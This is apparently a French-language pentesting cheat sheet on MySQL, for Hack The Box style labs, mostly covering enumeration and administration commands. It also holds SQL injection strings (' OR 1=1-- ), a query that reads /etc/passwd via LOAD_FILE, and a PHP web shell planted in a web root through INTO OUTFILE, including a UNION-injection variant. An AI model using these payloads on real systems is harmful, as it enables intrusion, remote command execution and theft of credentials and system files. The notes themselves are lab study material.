| | |
| --- | --- |
|# |	commentaire |
| `-- ` | 	commentaire (suivi d'un espace en MySQL)|
|‘abc’|	guillemets simples pour délimiter chaîne de charactères|
|'-- 	|		Fermer la chaîne et commenter la suite|
|' OR 1=1-- |	Retourne tout, 1=1 toujours vrai|
	
# Connexion

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
mysql -u rot -h docket.hackthebox.eu -P 3306 -p
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# BD par défaut
| nom | description |
| --- | --- |
| mysql | is the system database that contains tables that store information required by the MySQL server |
| information_schema | provides access to database metadata |
| performance_schema | is a feature for monitoring MySQL Server execution at a low level |
| sys | 			a set of objects that helps DBAs and developers interpret data collected by the Performance Schema|

# Info Système
|        Command                      |                                                                      Description                                                                                         |
| --- | --- |
| ```mysql -u <user> -p<password> -h <IP address>``` | Connect to the MySQL server. There should not be a space between the '-p' flag, and the password. |
| ```select version();``` |  |
| ```select system_user();``` |  |
| ```select user()``` <br>```select current_user()``` <br>```select user from mysql.user``` | Utilisateur actuel |
| ```select super_priv from mysql.user``` | Si possède priv super admin. Retourne (Y/N) |
| ```SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="root'@'localhost'"``` | Tous les priv |

System Schema (sys) et information schema (information_schema) contienent de l'information de gestion. Information schema provient sûrtout de system schema.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
mysql> use sys;
mysql> show tables;
select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA;
select TABLE_NAME, TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='NOM_DB'
select column_name, table_name, table_schema from information_schema.columns where table_name='NOM_TABLE'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Commandes utiles

|                                        Command                      |                                                                      Description                                                                                         |
| --- | --- |
| ```show databases;```  | Show all databases. |
| ```use <database>;```  | Select one of the existing databases. |
| ```show tables;```  | Show all available tables in the selected database. |
| ```show columns from <table>;``` | Show all columns in the selected database. |
| ```select * from <table>;```  | Show everything in the desired table. |
| ```select * from <table> where <column> = "<string>";```  | Search for needed string in the desired table. |
| ```Describe <table>;``` | liste la structure d'une table |
| ```Select * from [nom_BD].[nom_table]``` | Lire une autre base de données (pratique pour union attaque) |

# Outils
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
mysql -u root -p -h 192.168.50.16 -P 3306
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Écriture de fichier
utilisateur de la DB doit avoir privilège **FILE**
variable MySQL global **secure_file_priv** pas activé ou valeur de chemin. Si NULL, aucune écriture possible.	
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SHOW VARIABLES LIKE 'secure_file_priv';
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Par défaut:
* MariaDB: 	aucune restriction
* MySQL: 	 /var/lib/mysql-files
L'usager doit avoir accès en écriture où l'on écrit
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- webshell
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "C:/xampp/htdocs/webshell.php"
-- avec union
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "C:xampp\htdocs\webshell.php" -- //
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Lecture de fichiers
Pas actif par défaut
utilisateur de la DB doit avoir privilège FILE

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ sql
select LOAD_FILE("/etc/passwd");
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Fichier de config
Information intéressante comme nom et mot de passe
/etc/mysql/mysql.conf.d/mysqld.cnf